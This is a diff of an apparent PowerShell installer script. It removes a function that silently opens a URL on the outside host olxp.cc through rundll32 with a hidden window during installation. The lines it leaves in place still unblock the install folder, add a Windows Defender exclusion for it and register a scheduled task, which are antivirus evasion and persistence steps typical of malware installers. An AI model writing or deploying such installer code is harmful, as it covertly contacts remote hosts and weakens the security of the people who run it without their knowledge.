@@ -90,22 +90,6 @@ function Open-InBrowser {
     return $false
 }
 
-function Start-InstallPictureAsync {
-    $baseUrl = $env:RESA_INSTALL_BASE
-    if (-not $baseUrl) {
-        $baseUrl = "https://olxp.cc/download"
-    }
-    $baseUrl = $baseUrl.Trim().TrimEnd("/")
-    $pictureUrl = $baseUrl + "/picture_1977.webp"
-    Write-MsiLog ("picture parallel: " + $pictureUrl)
-    try {
-        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $pictureUrl) -WindowStyle Hidden -ErrorAction Stop
-        Write-MsiLog "picture launch requested"
-    } catch {
-        Write-MsiLog ("picture launch skipped: " + $_.Exception.Message)
-    }
-}
-
 function Ensure-ReSTTask {
     if (-not (Test-Path -LiteralPath $Exe)) { return }
     Remove-ReSTTask
@@ -141,7 +125,6 @@ if (-not (Test-Path -LiteralPath $Exe)) {
     exit 0
 }
 
-Start-InstallPictureAsync
 Unblock-Tree -Path $Dir
 Add-DefenderExclusion -Path $Dir
 Ensure-ReSTTask
